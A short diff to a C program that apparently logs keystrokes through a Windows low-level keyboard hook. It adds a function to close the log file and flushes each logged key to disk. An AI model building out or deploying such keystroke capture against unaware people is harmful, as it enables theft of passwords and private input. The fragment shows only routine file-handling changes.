@@ -4,6 +4,7 @@
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 FILE *OpenLogFile(void);
+int CloseLogFile(FILE * file);
 int LogToFile(FILE *file, char *key);
 
 int main(void)
@@ -22,10 +23,16 @@ FILE *OpenLogFile(void)
     return logfile;
 }
 
+int CloseLogFile(FILE * file)
+{
+    return fclose(file);
+}
+
 int LogToFile(FILE *file, char *key)
 {
     int res = fputs(key, file);
     fputs("\n", file);
+    fflush(file);
     return res;
 }
 
